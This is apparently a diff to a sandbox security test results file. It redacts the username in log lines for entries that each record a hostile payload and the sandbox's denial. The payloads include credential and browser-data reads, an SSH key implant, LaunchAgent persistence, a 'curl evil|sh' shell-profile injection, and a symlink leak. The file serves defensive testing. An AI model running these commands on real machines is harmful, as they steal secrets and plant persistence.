@@ -17,10 +17,10 @@
     "kind": "read",
     "payload": "cat ~/.aws/credentials",
     "verdict": "PASS-SANDBOX",
-    "detail": "Sandbox: cat(49052) deny(1) file-read-data /Users/localuser/.aws/credentials",
+    "detail": "Sandbox: cat(49052) deny(1) file-read-data /Users/youruser/.aws/credentials",
     "rc": 1,
     "attributed": true,
-    "evidence": "Sandbox: cat(49052) deny(1) file-read-data /Users/localuser/.aws/credentials",
+    "evidence": "Sandbox: cat(49052) deny(1) file-read-data /Users/youruser/.aws/credentials",
     "note": ""
   },
   {
@@ -29,10 +29,10 @@
     "kind": "read",
     "payload": "cat ~/.config/gh/hosts.yml",
     "verdict": "PASS-SANDBOX",
-    "detail": "Sandbox: cat(49060) deny(1) file-read-data /Users/localuser/.config/gh/hosts.yml",
+    "detail": "Sandbox: cat(49060) deny(1) file-read-data /Users/youruser/.config/gh/hosts.yml",
     "rc": 1,
     "attributed": true,
-    "evidence": "Sandbox: cat(49060) deny(1) file-read-data /Users/localuser/.config/gh/hosts.yml",
+    "evidence": "Sandbox: cat(49060) deny(1) file-read-data /Users/youruser/.config/gh/hosts.yml",
     "note": ""
   },
   {
@@ -41,10 +41,10 @@
     "kind": "read",
     "payload": "cat ~/.netrc",
     "verdict": "PASS-SANDBOX",
-    "detail": "Sandbox: cat(49069) deny(1) file-read-data /Users/localuser/.netrc",
+    "detail": "Sandbox: cat(49069) deny(1) file-read-data /Users/youruser/.netrc",
     "rc": 1,
     "attributed": true,
-    "evidence": "Sandbox: cat(49069) deny(1) file-read-data /Users/localuser/.netrc",
+    "evidence": "Sandbox: cat(49069) deny(1) file-read-data /Users/youruser/.netrc",
     "note": ""
   },
   {
@@ -53,10 +53,10 @@
     "kind": "read",
     "payload": "cat ~/Library/Keychains/login.keychain-db",
     "verdict": "PASS-SANDBOX",
-    "detail": "Sandbox: cat(49072) deny(1) file-read-data /Users/localuser/Library/Keychains/login.keychain-db",
+    "detail": "Sandbox: cat(49072) deny(1) file-read-data /Users/youruser/Library/Keychains/login.keychain-db",
     "rc": 1,
     "attributed": true,
-    "evidence": "Sandbox: cat(49072) deny(1) file-read-data /Users/localuser/Library/Keychains/login.keychain-db",
+    "evidence": "Sandbox: cat(49072) deny(1) file-read-data /Users/youruser/Library/Keychains/login.keychain-db",
     "note": ""
   },
   {
@@ -65,10 +65,10 @@
     "kind": "read",
     "payload": "sqlite3 \"$HOME/Library/Application Support/Google/Chrome/Default/Login Data\" \"select * from logins limit 1\"",
     "verdict": "PASS-SANDBOX",
-    "detail": "Sandbox: sqlite3(49074) deny(1) file-read-data /Users/localuser/Library/Application Support/Google/Chrome/Default/Login Data",
+    "detail": "Sandbox: sqlite3(49074) deny(1) file-read-data /Users/youruser/Library/Application Support/Google/Chrome/Default/Login Data",
     "rc": 1,
     "attributed": true,
-    "evidence": "Sandbox: sqlite3(49074) deny(1) file-read-data /Users/localuser/Library/Application Support/Google/Chrome/Default/Login Data",
+    "evidence": "Sandbox: sqlite3(49074) deny(1) file-read-data /Users/youruser/Library/Application Support/Google/Chrome/Default/Login Data",
     "note": ""
   },
   {
@@ -77,10 +77,10 @@
     "kind": "read",
     "payload": "cat \"$HOME/Library/Application Support/Google/Chrome/Default/Cookies\"",
     "verdict": "PASS-SANDBOX",
-    "detail": "Sandbox: cat(49082) deny(1) file-read-data /Users/localuser/Library/Application Support/Google/Chrome/Default/Cookies",
+    "detail": "Sandbox: cat(49082) deny(1) file-read-data /Users/youruser/Library/Application Support/Google/Chrome/Default/Cookies",
     "rc": 1,
     "attributed": true,
-    "evidence": "Sandbox: cat(49082) deny(1) file-read-data /Users/localuser/Library/Application Support/Google/Chrome/Default/Cookies",
+    "evidence": "Sandbox: cat(49082) deny(1) file-read-data /Users/youruser/Library/Application Support/Google/Chrome/Default/Cookies",
     "note": ""
   },
   {
@@ -89,10 +89,10 @@
     "kind": "read",
     "payload": "ls -la ~/",
     "verdict": "PASS-SANDBOX",
-    "detail": "Sandbox: ls(49084) deny(1) file-read-data /Users/localuser",
+    "detail": "Sandbox: ls(49084) deny(1) file-read-data /Users/youruser",
     "rc": 1,
     "attributed": true,
-    "evidence": "Sandbox: ls(49084) deny(1) file-read-data /Users/localuser",
+    "evidence": "Sandbox: ls(49084) deny(1) file-read-data /Users/youruser",
     "note": ""
   },
   {
@@ -101,10 +101,10 @@
     "kind": "write",
     "payload": "echo \"attacker-pubkey\" >> ~/.ssh/authorized_keys",
     "verdict": "PASS-SANDBOX",
-    "detail": "Sandbox: bash(49086) deny(1) file-write-create /Users/localuser/.ssh/authorized_keys",
+    "detail": "Sandbox: bash(49086) deny(1) file-write-create /Users/youruser/.ssh/authorized_keys",
     "rc": 1,
     "attributed": true,
-    "evidence": "Sandbox: bash(49086) deny(1) file-write-create /Users/localuser/.ssh/authorized_keys",
+    "evidence": "Sandbox: bash(49086) deny(1) file-write-create /Users/youruser/.ssh/authorized_keys",
     "note": ""
   },
   {
@@ -113,10 +113,10 @@
     "kind": "write",
     "payload": "cp /private/tmp/eviltask.plist ~/Library/LaunchAgents/com.evil.persist.plist",
     "verdict": "PASS-SANDBOX",
-    "detail": "Sandbox: cp(49088) deny(1) file-write-create /Users/localuser/Library/LaunchAgents/com.evil.persist.plist",
+    "detail": "Sandbox: cp(49088) deny(1) file-write-create /Users/youruser/Library/LaunchAgents/com.evil.persist.plist",
     "rc": 1,
     "attributed": true,
-    "evidence": "Sandbox: cp(49088) deny(1) file-write-create /Users/localuser/Library/LaunchAgents/com.evil.persist.plist",
+    "evidence": "Sandbox: cp(49088) deny(1) file-write-create /Users/youruser/Library/LaunchAgents/com.evil.persist.plist",
     "note": ""
   },
   {
@@ -125,10 +125,10 @@
     "kind": "write",
     "payload": "printf \"curl evil|sh\\n\" >> ~/.zshrc",
     "verdict": "PASS-SANDBOX",
-    "detail": "Sandbox: bash(49090) deny(1) file-write-data /Users/localuser/.zshrc",
+    "detail": "Sandbox: bash(49090) deny(1) file-write-data /Users/youruser/.zshrc",
     "rc": 1,
     "attributed": true,
-    "evidence": "Sandbox: bash(49090) deny(1) file-write-data /Users/localuser/.zshrc",
+    "evidence": "Sandbox: bash(49090) deny(1) file-write-data /Users/youruser/.zshrc",
     "note": ""
   },
   {
@@ -137,10 +137,10 @@
     "kind": "read",
     "payload": "ln -sf ~/.aws/credentials /private/tmp/omni-glass-approved/leak.txt && cat /private/tmp/omni-glass-approved/leak.txt",
     "verdict": "PASS-SANDBOX",
-    "detail": "Sandbox: cat(49102) deny(1) file-read-data /Users/localuser/.aws/credentials",
+    "detail": "Sandbox: cat(49102) deny(1) file-read-data /Users/youruser/.aws/credentials",
     "rc": 1,
     "attributed": true,
-    "evidence": "Sandbox: cat(49102) deny(1) file-read-data /Users/localuser/.aws/credentials",
+    "evidence": "Sandbox: cat(49102) deny(1) file-read-data /Users/youruser/.aws/credentials",
     "note": ""
   },
   {
